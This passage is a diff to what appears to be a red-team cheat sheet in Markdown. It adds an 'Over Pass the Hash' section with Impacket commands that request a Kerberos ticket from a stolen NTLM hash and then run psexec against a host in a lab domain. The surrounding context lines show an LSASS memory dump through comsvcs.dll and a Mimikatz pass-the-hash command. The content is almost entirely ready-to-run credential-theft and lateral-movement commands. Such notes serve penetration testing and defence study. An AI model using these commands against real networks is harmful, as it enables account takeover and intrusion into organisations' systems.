@@ -96,6 +96,17 @@ rundll32.exe C:\windows\System32\comsvcs.dll ,MiniDump <lsass pid> C:\Users\Publ
 
 ---
 ### Over Pass the Hash
+**NTLM hash/AES Key/Password of the target user account is needed**. A TGT can be requested for that account. Finally, it is possible to access any service or machine where the user account has permissions.
+
+#### From Linux
+```bash
+python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
+
+export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
+
+psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
+```
+
 >Generates kerberos tickets
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administartor /domain:example.local /aes256:<aes256Key> /run:powershell.exe"'
